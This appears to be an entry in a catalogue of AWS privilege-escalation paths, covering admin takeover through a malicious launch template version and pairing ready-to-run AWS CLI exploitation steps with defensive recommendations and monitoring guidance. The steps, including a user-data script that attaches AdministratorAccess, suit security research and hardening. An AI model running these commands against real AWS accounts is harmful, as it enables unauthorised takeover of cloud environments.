id: ec2-005
name: ec2:CreateLaunchTemplateVersion + ec2:ModifyLaunchTemplate
category: existing-passrole
services:
  - iam
  - ec2

permissions:
  required:
    - permission: ec2:CreateLaunchTemplateVersion
      resourceConstraints: Must be able to create a new version of the target launch template
    - permission: ec2:ModifyLaunchTemplate
      resourceConstraints: Must be able to modify the target launch template to set the new version as default
  additional:
    - permission: ec2:DescribeLaunchTemplates
      resourceConstraints: Helpful for discovering launch templates with privileged instance profiles attached
    - permission: ec2:DescribeLaunchTemplateVersions
      resourceConstraints: Useful for viewing the current default version configuration before creating the malicious version
    - permission: ec2:RunInstances
      resourceConstraints: Can be used to trigger a new instance from the modified template; alternatively an existing Auto Scaling Group or EC2 Fleet that references the template will launch instances on the next scale-out event
    - permission: iam:ListAttachedUserPolicies
      resourceConstraints: Useful for verifying privilege escalation success

description: A principal with `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` can escalate privileges by creating a new version of an existing EC2 launch template that already has an admin IAM instance profile attached. The new version preserves the admin instance profile but embeds a malicious user-data script. Setting this version as the default means any new instance launched from the template — whether via Auto Scaling Group scale-out, EC2 Fleet refresh, or direct `ec2:RunInstances` — will execute the user-data script with the admin role's credentials, calling `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user.

prerequisites:
  admin:
    - An existing EC2 launch template must already have an admin IAM instance profile attached
    - An Auto Scaling Group, EC2 Fleet, or other mechanism must reference the launch template (or the attacker has ec2:RunInstances to trigger a launch manually)
    - The admin instance profile role must have permissions to call iam:AttachUserPolicy
  lateral:
    - An existing EC2 launch template must have an elevated IAM instance profile attached
    - A mechanism must exist to trigger instance launches from the template

exploitationSteps:
  awscli:
    - step: 1
      command: |
        aws ec2 describe-launch-templates \
          --query 'LaunchTemplates[*].{Name:LaunchTemplateName,Id:LaunchTemplateId,DefaultVersion:DefaultVersionNumber}' \
          --output table
      description: Enumerate existing launch templates to identify ones with privileged instance profiles. Look for templates associated with Auto Scaling Groups or EC2 Fleets that will launch instances automatically.
    - step: 2
      command: |
        aws ec2 describe-launch-template-versions \
          --launch-template-id LAUNCH_TEMPLATE_ID \
          --versions '$Default' \
          --query 'LaunchTemplateVersions[0].LaunchTemplateData' \
          --output json
      description: Inspect the current default version to retrieve the AMI ID, instance type, and confirm the admin instance profile is attached.
    - step: 3
      command: |
        USER_DATA=$(cat <<'EOF' | base64 | tr -d '\n'
        #!/bin/bash
        sleep 15
        aws iam attach-user-policy \
          --user-name STARTING_USER \
          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
        EOF
        )

        aws ec2 create-launch-template-version \
          --launch-template-id LAUNCH_TEMPLATE_ID \
          --source-version '$Default' \
          --launch-template-data "{
            \"UserData\": \"$USER_DATA\"
          }"
      description: Create a new launch template version sourced from the existing default. The source version inherits the admin instance profile — only the UserData field is changed to embed the malicious script that calls iam:AttachUserPolicy when the instance boots.
    - step: 4
      command: |
        aws ec2 modify-launch-template \
          --launch-template-id LAUNCH_TEMPLATE_ID \
          --default-version NEW_VERSION_NUMBER
      description: Set the new malicious version as the default. Any instance launched from this template from this point forward will execute the malicious user-data script with the admin instance profile's credentials.
    - step: 5
      command: |
        aws iam list-attached-user-policies \
          --user-name STARTING_USER
      description: Wait for an instance to launch (via Auto Scaling Group scale-out, EC2 Fleet, or manual RunInstances), then verify AdministratorAccess has been attached to the starting user.

recommendation: |
  - **Audit launch templates for privileged instance profiles** - Any launch template with an admin or high-privilege instance profile is a persistent escalation vector for any principal with `ec2:CreateLaunchTemplateVersion`. Regularly review and down-scope instance profiles referenced in launch templates.
  - **Restrict `ec2:CreateLaunchTemplateVersion`** - This permission allows creating new template versions with arbitrary user-data and instance configurations. Only trusted principals (e.g., infrastructure automation) should have this permission. Use IAM conditions to restrict which launch templates can be modified:

  ```json
  {
    "Effect": "Allow",
    "Action": "ec2:CreateLaunchTemplateVersion",
    "Resource": "arn:aws:ec2:REGION:ACCOUNT_ID:launch-template/lt-SPECIFIC_TEMPLATE_ID"
  }
  ```

  - **Restrict `ec2:ModifyLaunchTemplate`** - Setting a new default version activates the malicious user-data for all future instances. Restrict this permission to the same trusted CI/CD principals that manage template versions.
  - **Apply instance metadata service (IMDSv2) controls** - Require IMDSv2 on all EC2 instances to limit the blast radius of credential access via IMDS, even if an attacker gains code execution via user-data.
  - Monitor CloudTrail for `ec2:CreateLaunchTemplateVersion` calls followed closely by `ec2:ModifyLaunchTemplate`, especially from principals who don't normally manage launch templates
  - Monitor CloudTrail for launch template version changes that modify the `UserData` field
  - Alert on IAM policy attachment events (`iam:AttachUserPolicy`, `iam:AttachRolePolicy`) where the source is an EC2 instance role
  - Regularly audit all EC2 launch templates and Auto Scaling Groups for privileged instance profiles

limitations: |
  This path requires that an existing launch template already has an admin or elevated instance profile attached. The attacker does not need `iam:PassRole` because the instance profile was previously assigned — `ec2:CreateLaunchTemplateVersion` inherits it via `--source-version`. The escalation also depends on a trigger to actually launch an instance from the modified template. If no Auto Scaling Group or Fleet references the template, the attacker may need `ec2:RunInstances` to trigger the launch.

